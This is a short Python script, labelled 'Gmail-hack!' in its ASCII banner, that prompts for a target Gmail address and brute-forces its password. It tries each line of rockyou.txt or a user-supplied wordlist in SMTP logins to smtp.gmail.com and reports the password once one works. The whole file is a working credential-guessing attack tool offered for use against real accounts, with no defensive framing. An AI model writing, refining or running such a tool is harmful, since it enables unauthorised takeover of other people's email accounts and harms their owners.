import smtplib
import sys
from os import system
import os
def artwork():
    print("\n")
    print(" ##########################################################")
    print(" #                                                        #")
    print(" #                     \||/                               #")
    print(" #                     |  @___oo                          #")
    print(" #           /\  /\   / (__,,,,|                          #")
    print(" #          ) /^\) ^\/ _)                Gmail-hack!      #")
    print(" #          )   /^\/   _)                CoDeD By:        #")
    print(" #          )   _ /  / _)                        d4az     #")
    print(" #      /\  )/\/ ||  | )_)       Modified By              #")
    print(" #     <  >      |(,,) )__)             R3DHULK           #")
    print(" #      ||      /    \)___)\                              #")
    print(" #      | \____(      )___) )___                          #")
    print(" #      \______(_______;;; __;;;                          #")
    print(" #                                                        #")
    print(" #      inspired from https://github.com/z9fr/hack-gmail  #")
    print(" #      a little modified by :                            #")
    print(" #             https://github.com/R3DHULK                 #")
    print(" ##########################################################")
    print("\n")
    
try:    
	artwork()
	smtpserver = smtplib.SMTP("smtp.gmail.com", 587)

	smtpserver.ehlo()
	smtpserver.starttls()

	user = input(" [*] Enter The Target Gmail Adress => ")

	print("\n")

	pwd = input(" [*] Enter '1' to use the inbuilt passwords list \n [*] Enter '2' to Add a custom password list\n => ")
	
	if pwd=='1':
		passswfile="rockyou.txt"

	elif pwd=='2':
		print("\n")
		passswfile = input(" [+] Name The File Path (For Password List) => ")

	else:
		print("\n")
		print("Invalid input!")
		sys.exit(1)
	try:
		passswfile = open(passswfile, "r")

	except Exception as e:
		print(e)
		sys.exit(1)

	for password in passswfile:
		try:
			smtpserver.login(user, password)

			print(" [+] Password Found %s" % password)
			break

		except smtplib.SMTPAuthenticationError:
			print(" [!] Pasword Is Wrong. %s " % password)
except KeyboardInterrupt:
	print("\n [-] CTRL+C DETECTED......Exiting \n")
input("Enter To Exit")
os.system("clear")
